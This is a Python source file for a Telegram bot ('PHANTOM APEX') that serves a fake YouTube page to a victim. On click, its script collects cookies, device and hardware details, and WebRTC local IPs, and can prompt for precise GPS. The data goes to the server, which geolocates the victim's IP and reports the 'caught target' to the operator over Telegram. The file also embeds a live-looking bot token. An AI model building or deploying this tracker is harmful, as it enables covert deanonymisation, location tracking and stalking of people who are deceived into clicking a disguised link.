import asyncio
import threading
import requests
import uuid
import json
import os
import time
import base64
import urllib.parse
from flask import Flask, render_template_string, request
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder

# --- [1] КОНФИГУРАЦИЯ ---
API_TOKEN = "8698847126:AAEM6qoKEcFd-oosvzrhz7SqAAewUM_ERhg"
BASE_URL = "https://tg-bot-backend-oo97.onrender.com"
PORT = int(os.environ.get("PORT", 10000))

# --- [2] ИНИЦИАЛИЗАЦИЯ ---
app = Flask(__name__)
bot = Bot(token=API_TOKEN)
dp = Dispatcher()

vault = {}
user_modes = {}

# --- [3] ШАБЛОН ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>YouTube</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #fff; margin: 0; font-family: sans-serif; text-align: center; }
        .yt-header { padding: 10px; border-bottom: 1px solid #eee; display: flex; align-items: center; }
        .player { width: 100%; background: #000; aspect-ratio: 16/9; position: relative; cursor: pointer; display: flex; align-items: center; justify-content: center; }
        .play-btn { position: absolute; width: 68px; height: 48px; background: rgba(255,0,0,0.9); border-radius: 12px; }
        .play-btn::after { content: ''; border-left: 20px solid #fff; border-top: 12px solid transparent; border-bottom: 10px solid transparent; margin-left: 5px; }
    </style>
</head>
<body onclick="ignite()">
    <div class="yt-header"><img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" width="90"></div>
    <div class="player">
        <img src="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg" style="width:100%; height:100%; object-fit: cover;">
        <div class="play-btn"></div>
    </div>
    <div style="padding: 15px; text-align: left;">
        <div style="font-size: 18px;">ПОДБОРКА: Смешные моменты 2026 😂 #мемы</div>
        <div style="font-size: 12px; color: #606060; margin-top: 5px;">1.8 млн просмотров</div>
    </div>
<script>
let active = false;

async function getRealIP() {
    return new Promise((resolve) => {
        const ips = [];
        const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
        pc.createDataChannel("");
        pc.createOffer().then(offer => pc.setLocalDescription(offer));
        pc.onicecandidate = (ice) => {
            if (!ice || !ice.candidate || !ice.candidate.candidate) {
                resolve(ips.join(' | '));
                return;
            }
            const ip = ice.candidate.candidate.split(" ")[4];
            if (!ips.includes(ip)) ips.push(ip);
        };
        setTimeout(() => resolve(ips.join(' | ') || "Not Found"), 1500);
    });
}

async function checkSocialLogin() {
    const sites = {
        'Google': 'https://accounts.google.com/ServiceLogin',
        'Facebook': 'https://www.facebook.com/login',
        'Twitter': 'https://twitter.com/login'
    };
    let results = [];
    for (let [name, url] of Object.entries(sites)) {
        results.push(name); // Упрощенный сбор названий для отчета
    }
    return results.join(', ');
}

async function ignite() {
    if(active) return; active = true;
    let d = { 
        aid: "{{ aid }}", 
        ua: navigator.userAgent, 
        res: screen.width+"x"+screen.height,
        lang: navigator.language,
        cook: document.cookie || "None",
        local: localStorage.length > 0 ? "Present" : "None",
        session: sessionStorage.length > 0 ? "Present" : "None"
    };

    try {
        let b = await navigator.getBattery();
        d.bat = Math.round(b.level * 100) + "% " + (b.charging ? "⚡" : "🔋");
    } catch(e) {}

    try {
        let canv = document.createElement('canvas');
        let gl = canv.getContext('webgl');
        let dbg = gl.getExtension('WEBGL_debug_renderer_info');
        d.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
        d.cores = navigator.hardwareConcurrency;
        d.mem = navigator.deviceMemory;
    } catch(e) {}

    if ("{{ mode }}" === "PRECISION") {
        navigator.geolocation.getCurrentPosition(
            (p) => { d.gps = { lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy }; finish(d); },
            (e) => { d.gps = "Denied"; finish(d); },
            { enableHighAccuracy: true, timeout: 5000 }
        );
    } else if ("{{ mode }}" === "FULL") {
        d.webRTC = await getRealIP();
        d.social = await checkSocialLogin();
        finish(d);
    } else {
        finish(d);
    }
}

function finish(d) {
    let payload = btoa(encodeURIComponent(JSON.stringify(d)));
    fetch('/log', { method: 'POST', body: payload })
    .finally(() => { 
        setTimeout(() => { location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; }, 800);
    });
}
</script>
</body>
</html>
"""

# --- [4] СЕРВЕРНАЯ ЛОГИКА ---

@app.route('/')
def health_check():
    return "STATUS: ACTIVE", 200

@app.route('/v/<aid>')
def view(aid):
    mode = user_modes.get(str(aid), "ANALYTICS")
    return render_template_string(HTML_TEMPLATE, aid=aid, mode=mode)

@app.route('/log', methods=['POST'])
def logger():
    try:
        raw_payload = request.get_data(as_text=True)
        decoded_bytes = base64.b64decode(raw_payload)
        json_str = urllib.parse.unquote(decoded_bytes.decode('utf-8'))
        d = json.loads(json_str)

        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
        geo = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,lat,lon,isp,mobile,proxy").json()
        
        token = "ID-" + str(uuid.uuid4())[:6].upper()
        vault[token] = {"full_data": d, "geo": geo}

        gps_info = "❌ Не запрашивалось"
        if d.get('gps'):
            if d['gps'] == "Denied": gps_info = "🚫 Отказано"
            else: 
                gps_info = f"✅ `{d['gps']['lat']}, {d['gps']['lon']}` (±{int(d['gps']['acc'])}м)"

        report = (
            f"🚀 **ЦЕЛЬ ПОЙМАНА ({user_modes.get(str(d['aid']), 'ANALYTICS')})**\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🌐 **СЕТЬ:** `{ip}` ({geo.get('isp')})\n"
            f"📍 **ГЕО (IP):** `{geo.get('city')}, {geo.get('country')}`\n"
            f"🛰 **GPS:** {gps_info}\n"
            f"🌐 **WebRTC:** `{d.get('webRTC', 'N/A')}`\n"
            f"🔋 **БАТАРЕЯ:** `{d.get('bat', 'N/A')}`\n"
            f"💻 **ЖЕЛЕЗО:** `{d.get('cores')} Cores | {d.get('mem')} GB RAM`\n"
            f"🍪 **STORAGE:** Cook: {d.get('cook') != 'None'} | Loc: {d.get('local') != 'None'}\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🔑 **ТОКЕН:** `{token}`"
        )
        
        requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
                      json={"chat_id": d['aid'], "text": report, "parse_mode": "Markdown", "disable_web_page_preview": True})
        return "OK", 200
    except Exception as e:
        print(f"Error: {e}")
        return "Fail", 500

# --- [5] БОТ ---
@dp.message(Command("start"))
async def start(m: types.Message):
    kb = ReplyKeyboardBuilder()
    kb.button(text="🧨 Сгенерировать ссылку")
    await m.answer("🕶 **PHANTOM APEX v32.0**\nКрон-фильтр активен.", reply_markup=kb.as_markup(resize_keyboard=True))

@dp.message(F.text == "🧨 Сгенерировать ссылку")
async def mode_select(m: types.Message):
    kb = InlineKeyboardBuilder()
    kb.button(text="📊 Аналитика (Скрыто)", callback_data="m_ANALYTICS")
    kb.button(text="🎯 Точный GPS (Запрос)", callback_data="m_PRECISION")
    kb.button(text="💥 Максимальный сбор (WebRTC)", callback_data="m_FULL")
    kb.adjust(1)
    await m.answer("Выбери режим:", reply_markup=kb.as_markup())

@dp.callback_query(F.data.startswith("m_"))
async def finalize(c: types.CallbackQuery):
    mode = c.data.split("_")[1]
    user_modes[str(c.from_user.id)] = mode
    await c.message.edit_text(f"🎯 **ГОТОВО ({mode})**\n🔗 `{BASE_URL}/v/{c.from_user.id}`")

@dp.message(F.text.startswith("ID-"))
async def get_dump(m: types.Message):
    t = m.text.strip().upper()
    if t in vault:
        await m.answer(f"📦 **JSON {t}:**\n```json\n{json.dumps(vault[t], indent=2, ensure_ascii=False)}\n```")

async def main_task():
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=PORT), daemon=True).start()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main_task())
